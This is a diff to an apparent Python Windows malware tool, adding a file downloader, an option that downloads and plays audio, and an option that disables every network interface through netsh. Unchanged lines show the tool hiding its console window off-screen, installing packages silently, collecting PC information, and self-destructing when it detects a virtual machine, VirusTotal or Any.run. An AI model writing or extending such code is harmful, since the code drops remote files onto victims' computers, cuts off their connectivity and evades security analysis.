@@ -7,6 +7,11 @@ ss = False
 startup = False
 con_info = False
 pc_info = False
+down_file = False
+play_music = False
+
+fuck_internet = False
+
 
 import os
 try:
@@ -22,12 +27,14 @@ try:
     import shutil
     import pyautogui
     import subprocess
+    import time
+    import pygame
 
 except Exception as e:
     if hide:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
-    for pac in ["requests","psutil","pyautogui","secrets"]:
+    for pac in ["requests","psutil","pyautogui","secrets","pygame"]:
         os.system(f"pip install -q {pac}")
     import requests
     import psutil
@@ -41,6 +48,8 @@ except Exception as e:
     import shutil
     import pyautogui
     import subprocess
+    import time
+    import pygame
 
 
 class util:
@@ -158,18 +167,21 @@ while __name__ == "__main__":
     if anti_vm:
         if anti.vm():
             alert("VM")
+            time.sleep(5)
             util.destruct()
             exit()
 
     if anti_vt:
         if anti.vt():
             alert("Virus total")
+            time.sleep(5)
             util.destruct()
             exit()
 
     if anti_arun:
         if anti.arun():
             alert("Any.run")
+            time.sleep(5)
             util.destruct()
             exit()
 
@@ -252,6 +264,34 @@ Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
 
         with open(f"{folder_name}/pcinfo/Specs.txt", "w") as f:
             f.write(data)
+
+
+    if down_file:
+        down_file_path = ''
+        down_file_url = ''
+        r = requests.get(down_file_url)
+        r.raise_for_status()
+        with open(down_file_path, 'wb') as file:
+            file.write(r.content)
+
+    if play_music:
+        url = ''
+        r = requests.get(url)
+        r.raise_for_status()
+        with open('C:/temp_music.mp3', 'wb') as file:
+            file.write(r.content)
+
+        os.system("cls")
+        pygame.mixer.init()
+        pygame.mixer.music.load("C:/temp_music.mp3")
+        pygame.mixer.music.play()
+        while pygame.mixer.music.get_busy():
+            time.sleep(1)
+
+    if fuck_internet:
+        interface_names = list(psutil.net_if_stats().keys())
+        for name in interface_names:
+            os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
 
 
     input("END")
